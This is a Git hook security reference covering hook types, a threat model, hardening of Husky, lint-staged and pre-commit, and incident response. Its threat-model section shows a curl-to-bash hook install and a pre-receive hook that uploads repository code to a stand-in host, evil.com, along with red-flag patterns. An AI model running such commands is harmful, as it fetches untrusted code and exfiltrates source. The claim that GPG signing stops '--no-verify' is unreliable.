# Hook Security Reference

Git hook security, supply chain risks, and hardening strategies.

---

## Git Hook Types

### Client-Side Hooks

Run on developer's local machine:

| Hook | Trigger | Bypass | Risk Level |
|------|---------|--------|------------|
| `pre-commit` | Before commit created | `--no-verify` | Medium |
| `prepare-commit-msg` | Before commit message editor | `--no-verify` | Low |
| `commit-msg` | After commit message entered | `--no-verify` | Medium |
| `post-commit` | After commit created | Cannot bypass | Medium |
| `pre-rebase` | Before rebase | `--no-verify` | Low |
| `post-checkout` | After checkout | Cannot bypass | High |
| `post-merge` | After merge | Cannot bypass | High |
| `pre-push` | Before push | `--no-verify` | High |
| `post-rewrite` | After amend/rebase | Cannot bypass | Medium |

**Bypassable hooks** (accept `--no-verify`):
- `pre-commit`, `commit-msg`, `pre-push`, `pre-rebase`

**Non-bypassable hooks**:
- `post-commit`, `post-checkout`, `post-merge`, `post-rewrite`

### Server-Side Hooks

Run on git server (bare repository):

| Hook | Trigger | Bypass | Risk Level |
|------|---------|--------|------------|
| `pre-receive` | Before refs updated (all refs) | Cannot bypass | Critical |
| `update` | Before each ref updated | Cannot bypass | Critical |
| `post-receive` | After refs updated | Cannot bypass | High |
| `post-update` | After refs updated (legacy) | Cannot bypass | Medium |

**Key difference**: Server hooks cannot be bypassed and run with server privileges.

---

## Threat Model

### Attack Vectors

#### 1. Malicious Hook Installation

**Scenario**: Attacker adds malicious hook to repository instructions:

```markdown
# README.md (malicious)
## Setup
Run: curl https://evil.com/hook.sh | bash > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit
```

**Payload**: Hook exfiltrates code, credentials, or installs backdoor.

**Mitigation**:
- Never run untrusted scripts in `.git/hooks/`
- Review hook contents before installation
- Use hook managers (Husky) instead of curl-to-bash

#### 2. Supply Chain via Hook Managers

**Scenario**: Hook manager (Husky, lint-staged) has malicious dependency:

```json
{
  "devDependencies": {
    "husky": "^8.0.0",
    "malicious-dep": "^1.0.0"  // Compromised package
  }
}
```

**Payload**: npm install runs postinstall script that modifies hooks.

**Mitigation**:
- Pin dependency versions
- Use `npm ci` instead of `npm install`
- Audit dependencies with `npm audit`
- Review `package.json` and lock file changes

#### 3. Server-Side Hook Compromise

**Scenario**: Attacker gains access to bare repository and modifies `pre-receive` hook:

```bash
# Malicious pre-receive hook
#!/bin/bash
# Normal validation
/usr/local/bin/validate-commits

# Malicious exfiltration
tar czf /tmp/code.tar.gz $GIT_DIR/..
curl -F "file=@/tmp/code.tar.gz" https://evil.com/exfil
```

**Payload**: Exfiltrates all pushed code to attacker server.

**Mitigation**:
- Restrict server access (SSH keys, 2FA)
- Monitor hook file changes
- Use read-only hooks directory (set immutable flag)
- Audit server hooks regularly

---

## Client-Side Hook Security

### Review Hook Before Installation

```bash
# List active hooks
ls -la .git/hooks/

# View hook contents
cat .git/hooks/pre-commit

# Check for symlinks to external scripts
find .git/hooks/ -type l -ls
```

### Disable Hook Bypass

**Problem**: Users can bypass client hooks with `--no-verify`:

```bash
git commit --no-verify -m "skip hooks"
```

**Solution 1**: Enforce GPG signing (cannot use `--no-verify` with `-S`):

```bash
git config --global commit.gpgsign true
```

**Solution 2**: Use server-side hooks for critical checks.

### Set Custom Hooks Path

**Advanced**: Use global hooks directory:

```bash
# Create global hooks directory
mkdir -p ~/.git-hooks

# Set global hooks path
git config --global core.hooksPath ~/.git-hooks

# Add hooks
cat > ~/.git-hooks/pre-commit << 'EOF'
#!/bin/bash
gitleaks protect --staged
EOF
chmod +x ~/.git-hooks/pre-commit
```

**Benefit**: Consistent hooks across all repos, harder to bypass.

---

## Server-Side Hook Security

### Restrict Hook Modifications

**Set immutable flag** (Linux):

```bash
# Make hooks directory immutable
sudo chattr +i /path/to/bare-repo.git/hooks/

# To modify hooks, remove flag:
sudo chattr -i /path/to/bare-repo.git/hooks/
```

**Set read-only permissions**:

```bash
# Only root can modify hooks
sudo chown root:root /path/to/bare-repo.git/hooks/*
sudo chmod 755 /path/to/bare-repo.git/hooks/*
```

### Audit Server Hooks

```bash
#!/bin/bash
# Audit script: check server hooks for modifications

HOOKS_DIR="/path/to/bare-repo.git/hooks"

# Calculate checksums
find "$HOOKS_DIR" -type f -exec sha256sum {} \; > /tmp/hooks-checksums.txt

# Compare with known-good checksums
if ! diff /etc/git-hooks-baseline.txt /tmp/hooks-checksums.txt; then
  echo "❌ Server hooks modified!"
  # Alert security team
  exit 1
fi
```

### Example Secure pre-receive Hook

```bash
#!/bin/bash
# Secure pre-receive hook
# Validates commits, enforces GPG signing, scans for secrets

set -e

while read oldrev newrev refname; do
  # Get list of commits
  COMMITS=$(git rev-list "$oldrev..$newrev")

  for commit in $COMMITS; do
    # Enforce GPG signature
    if ! git verify-commit "$commit" 2>/dev/null; then
      echo "❌ Commit $commit is not GPG-signed"
      exit 1
    fi

    # Scan for secrets
    if ! git show "$commit" | gitleaks detect --no-git --verbose; then
      echo "❌ Commit $commit contains secrets"
      exit 1
    fi

    # Validate commit message format
    MSG=$(git log -1 --format=%B "$commit")
    if ! echo "$MSG" | grep -qE '^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\(.+\))?: .+'; then
      echo "❌ Commit $commit has invalid message format"
      exit 1
    fi
  done
done

echo "✅ All commits validated"
exit 0
```

---

## Husky Security

### Review Husky Configuration

Before `npm install`, check `package.json`:

```json
{
  "scripts": {
    "prepare": "husky install"  // Runs on npm install
  },
  "devDependencies": {
    "husky": "^8.0.0",
    "lint-staged": "^15.0.0"
  }
}
```

**Check**:
1. Husky version is latest
2. No suspicious `prepare` or `postinstall` scripts
3. Dependencies are from npm registry (not git URLs)

### Audit Husky Hooks

```bash
# Husky hooks are in .husky/
ls -la .husky/

# Review pre-commit hook
cat .husky/pre-commit

# Example safe hook:
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

npx lint-staged
```

**Red flags**:
- `curl` or `wget` commands
- Calls to external URLs
- Obfuscated code (`eval $(base64 -d ...)`)
- Unexpected file writes outside repo

### Pin Husky Version

```json
{
  "devDependencies": {
    "husky": "8.0.3",  // Exact version, not ^8.0.0
    "lint-staged": "15.2.0"
  }
}
```

Use `npm ci` to install exact versions from `package-lock.json`.

---

## Lint-Staged Security

### Review Lint-Staged Config

In `package.json` or `.lintstagedrc.json`:

```json
{
  "lint-staged": {
    "*.js": [
      "eslint --fix",
      "git add"  // Deprecated, avoid this
    ]
  }
}
```

**Red flags**:
- Commands that modify files (`sed`, `awk`, custom scripts)
- Network calls (`curl`, `wget`)
- Arbitrary command execution (`sh -c`, `eval`)

**Safe pattern**:

```json
{
  "lint-staged": {
    "*.js": "eslint --fix",
    "*.md": "markdownlint-cli2"
  }
}
```

### Avoid Arbitrary Commands

**Unsafe**:

```json
{
  "*.js": "curl https://example.com/format.sh | sh"
}
```

**Safe**:

```json
{
  "*.js": "prettier --write"
}
```

---

## Pre-Commit Framework Security

### Review .pre-commit-config.yaml

```yaml
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0  # Pin to specific version
    hooks:
      - id: trailing-whitespace
      - id: check-yaml

  - repo: local  # Local hooks
    hooks:
      - id: custom-check
        name: Custom Check
        entry: scripts/custom-check.sh  # Review this script
        language: script
```

**Security checks**:
1. Repos from trusted sources (GitHub official orgs)
2. Pinned to specific `rev` (not `master` or `main`)
3. Review `local` hooks carefully
4. No `language: system` hooks running arbitrary commands

### Install Pre-Commit Hooks

```bash
# Review config first
cat .pre-commit-config.yaml

# Install hooks
pre-commit install

# Verify installed hooks
cat .git/hooks/pre-commit
```

---

## Hook Bypass Detection

### Server-Side Detection

In `pre-receive` hook, check for bypassed client hooks:

```bash
#!/bin/bash
# Detect commits that bypassed pre-commit hooks

while read oldrev newrev refname; do
  COMMITS=$(git rev-list "$oldrev..$newrev")

  for commit in $COMMITS; do
    # Check if commit passes linting (should have been done locally)
    if ! git show "$commit" | eslint --stdin; then
      echo "❌ Commit $commit has linting errors (client hook bypassed?)"
      exit 1
    fi
  done
done
```

**Note**: This doesn't prevent bypass, but detects it server-side.

---

## Supply Chain Hardening

### Package Lock Integrity

```bash
# Verify package-lock.json integrity
npm ci

# Don't use npm install (can update lock file)
```

### Dependency Auditing

```bash
# Check for known vulnerabilities
npm audit

# Auto-fix (review changes)
npm audit fix

# Check Husky and lint-staged specifically
npm audit --package husky
npm audit --package lint-staged
```

### Subresource Integrity (SRI)

For CDN-based hook scripts:

```html
<!-- Don't do this for git hooks -->
<script src="https://cdn.example.com/hook.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
        crossorigin="anonymous"></script>
```

**Note**: Not applicable to git hooks, but relevant for web-based tools.

---

## Incident Response

### Compromised Hook Detected

1. **Stop using repository immediately**
2. **Review hook payload** - determine what it did
3. **Check for exfiltration** - network logs, file transfers
4. **Rotate credentials** - assume all secrets leaked
5. **Clean repository** - remove malicious hook
6. **Notify team** - warn all contributors
7. **Audit commits** - check for backdoored code

### Remediation Steps

```bash
# 1. Remove malicious hook
rm .git/hooks/pre-commit

# 2. Review git config for hooks path override
git config --local --get core.hooksPath
git config --global --get core.hooksPath

# 3. Re-clone from trusted source
git clone git@github.com:org/repo.git repo-clean

# 4. Re-install legitimate hooks
cd repo-clean
npm ci
npx husky install
```

---

**Last Updated**: 2026-02-16
